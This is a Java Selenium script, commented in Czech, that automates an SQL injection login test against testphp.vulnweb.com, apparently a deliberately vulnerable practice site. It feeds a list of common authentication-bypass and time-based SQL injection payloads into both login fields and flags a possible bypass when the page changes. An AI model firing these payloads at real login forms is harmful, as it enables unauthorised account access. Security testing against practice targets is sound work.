package UI;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.edge.EdgeDriver;

import io.github.bonigarcia.wdm.WebDriverManager;

public class SQLInjectionTest {

	public static String browser = "Chrome"; // nebo "Edge"
	public static WebDriver driver;

	public static void setUpDriver() {
		if (browser.equalsIgnoreCase("Edge")) {
			WebDriverManager.edgedriver().setup();
			driver = new EdgeDriver();
		} else {
			WebDriverManager.chromedriver().setup();
			driver = new ChromeDriver();
		}
		driver.manage().window().maximize();
	}

	// Krátká pauza mezi pokusy
	public static void pause(int seconds) {
		try {
			Thread.sleep(seconds * 1000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		setUpDriver();
		System.out.println("🧪 Spuštěn SQL Injection test");

		// Seznam běžných SQLi payloadů pro testování
		String[] sqlPayloads = { "' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*",
				"' OR '' = '", "' OR 1=1 LIMIT 1 OFFSET 1 --", "' OR EXISTS(SELECT * FROM users) --",
				"' OR (SELECT COUNT(*) FROM users) > 0 --", "' OR sleep(2)--", "admin' --", "' OR 'x'='x",
				"' OR 'x'='x'--", "' or ''='", "'='", "1'1", "' OR 1=1 ORDER BY 1--", "\" OR \"1\"=\"1",
				"' OR 1=CONVERT(int, '1')--" };

		int maxAttempts = sqlPayloads.length;

		for (int i = 0; i < maxAttempts; i++) {
			driver.get("https://testphp.vulnweb.com/login.php");
			System.out.println("🔁 Pokus #" + (i + 1) + " s payloadem: " + sqlPayloads[i]);

			WebElement username = driver.findElement(By.name("uname"));
			WebElement password = driver.findElement(By.name("pass"));
			WebElement loginBtn = driver.findElement(By.name("login"));

			username.clear();
			password.clear();

			username.sendKeys(sqlPayloads[i]);
			password.sendKeys(sqlPayloads[i]); // Použijeme stejný payload pro obě pole
			loginBtn.click();

			pause(2); // čekání na reakci

			String currentUrl = driver.getCurrentUrl();
			if (!currentUrl.contains("login.php")) {
				System.out.println("🚨 Možná úspěšná SQL injection! URL: " + currentUrl);
				break; // přihlašování uspělo – stačí jeden zásah
			} else {
				System.out.println("❌ Login selhal, vstup odmítnut.");
			}
		}

		driver.quit();
		System.out.println("🔚 Test dokončen.");
	}
}
